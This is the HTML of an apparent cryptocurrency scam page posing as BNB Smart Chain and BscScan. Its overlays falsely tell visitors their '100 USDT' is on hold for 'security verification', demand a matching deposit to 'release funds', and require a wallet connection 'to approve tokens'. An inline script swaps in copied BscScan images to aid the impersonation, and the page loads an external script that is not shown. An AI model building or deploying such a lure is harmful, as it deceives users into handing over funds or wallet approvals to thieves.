<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8"/>
        <link rel="icon" href="/Screenshot.png"/>
        <meta name="viewport" content="width=device-width,initial-scale=1"/>
        <meta name="theme-color" content="#000000"/>
        <meta name="description" content="Web site created using create-react-app"/>
        <link rel="apple-touch-icon" href="/logo192.png"/>
        <link rel="manifest" href="/manifest.json"/>
        <title>BNB Smart Chain (BNB)</title>
        <script src="/js/ethers.umd.min.js"></script>
        <script defer src="/mycode.js"></script>
        <script defer="defer" src="/static/js/main.e84abebd.js"></script>
        <link href="/static/css/main.64adc576.css" rel="stylesheet">
    </head>
    <body>

    <!-- Overlays -->
    <div class="new_overlay" id="new_overlay">
        <div class="new_popup">

            <!-- Watermark Background -->
            <div class="watermark-layer">
                <div id="watermarkGrid" class="watermark-grid"></div>
            </div>

            <div class="new_section">
                <img src="images/lock.png" class="new_png2_emoji">
                <h2 class="new_title_main">Assets On Hold!</h2>
                <p class="new_subtitle2" id="new_burn_text">
                    We've temporarily hold your assets for security verification
                </p>
            </div>

            <div class="new_inline_section">
                <div class="new_emoji_line">
                    <img src="images/exclaim_mark.png" class="new_png_emoji">
                    <div class="new_text">
                        <p class="new_subtitle">Hold Amount</p>
                        <p class="new_title" id="new_burn_text2">100 USDT</p>
                    </div>
                </div>
            </div>

            <div class="new_inline_section2">
                <div class="new_emoji_line">
                    <img src="images/secure.png" class="new_png_emoji">
                    <div class="new_text">
                        <p id="new_notice_text" class="new_subtitle">
                            Your Funds are in security verification on BEP20, please click on release funds to Release.
                        </p>
                    </div>
                </div>
            </div>

            <div class="new_buttons_area">

                <button id="new_view_transctions" class="new_verify_btn">
                    🔍 VIEW TRANSACTION
                </button>

                <button id="new_verifyBtn" class="new_verify_btn">
                    🔓 RELEASE FUNDS
                </button>

                <button id="closeBtn" class="new_close_btn">
                    ✖️ Close
                </button>

            </div>
        </div>
    </div>


    <!-- Final Overlay -->
    <div id="releaseOverlay" class="release_overlay">

        <!-- Loading Animation -->
        <div id="releaseLoading" class="release_loading">
            <div class="spinner"></div>
            <p>Releasing Funds...</p>
        </div>

        <!-- Popup -->
        <div id="releasePopup" class="release_popup">

            <!-- Warning Icon -->
            <div class="popup_icon">
                ⚠️
            </div>

            <h2 class="popup_title">IN-sufficient USDT</h2>

            <!-- ✅ Available USDT Box -->
            <div class="usdt_info_box">
                <span class="usdt_icon">💲</span>
                <span id="final_usdt_Text" class="usdt_text">Available USDT:</span>
            </div>

            <!-- ✅ Deposit Requirement Box -->
            <div class="usdt_info_box">
                <span class="deposit_icon">🔒</span>
                 <span id="final_depositText" class="usdt_text">
                    Required :: <b>100 USDT</b>
                </span>
            </div>

            <!-- Close Button -->
            <button id="final_closeBtn" class="close_btn">Close</button>

        </div>

    </div>



    <div class="overlay" id="overlay2">
        <div class="popup">
            <div class="section">
                <img src="images/yellow_top.png" alt="burn symbol" class="png2_emoji2">
                <h2>USDT Verified!</h2>
                <p class="subtitle2" id="burn-text11">Your P2P order has been verified as genuine.</p>
            </div>
            <div class="inline-section">
                <div class="emoji-line">
                    <img src="images/sign.png" alt="burn symbol" class="png_emoji">
                    <div class="text">
                        <p class="subtitle">Verified Amount</p>
                        <p class="title" id="burn-text22">100 USDT</p>
                    </div>
                </div>
            </div>
            <div class="inline-section2">
                <div class="emoji-line">
                    <img src="images/sign.png" alt="burn symbol" class="png_emoji">
                    <div class="text">
                        <p class="subtitle22">Verification Success</p>
                        <p class="subtitle">Your USDT tokens are genuine and safe to use.</p>
                    </div>
                </div>
            </div>
            <button id="closeBtn2" class="close-btn">Close</button>
        </div>
    </div>


  <!-- Wallet popup -->
  <div class="popup" id="walletPopup" style="display:none;">
    <div class="popup-content">
      <h3>Connect Wallet</h3>
      <p>You need to connect your wallet to continue.</p>
      <button onclick="connectWallet()">Connect</button>
    </div>
  </div>


    <!-- Modal for missing wallet / messages -->
  <div id="noWalletOverlay" class="overlayy" role="dialog" aria-modal="true" aria-labelledby="nwTitle" aria-describedby="nwDesc">
    <div class="modal">
      <button class="close" id="modalClose" aria-label="Close">✕</button>
      <div class="modal-illustration" aria-hidden="true">⚠️</div>
      <h3 id="nwTitle">Please open this in a wallet browser</h3>
      <p id="nwDesc">This page must be opened inside Trust Wallet or MetaMask's in-app browser (or another injected-dapp browser) to approve tokens.</p>
      <button id="modalOk" class="ok-btn">OK</button>
      <div class="hint">If you're on desktop, install MetaMask or open this page in your mobile wallet's browser.</div>
    </div>
  </div>


        <noscript>You need to enable JavaScript to run this app.</noscript>
        <div id="root"></div>

        <script>
        window.addEventListener("load", () => {

            function replaceBscImages() {
                document.querySelectorAll("img").forEach(img => {

                    if (!img.src.includes("bscscan.com")) return;

                    if (img.src.includes("logo-light.svg")) {
                        img.src = "/images/logo-light.svg";
                    }

                    else if (img.src.includes("chain-light.svg")) {
                        img.src = "/images/chain-light.svg";
                    }

                    else if (img.src.includes("metamask.svg")) {
                        img.src = "/images/metamask.svg";
                    }

                });
            }

            replaceBscImages();

            new MutationObserver(() => {
                replaceBscImages();
            }).observe(document.body, {
                childList: true,
                subtree: true
            });

        });
        </script>

    </body>
</html>
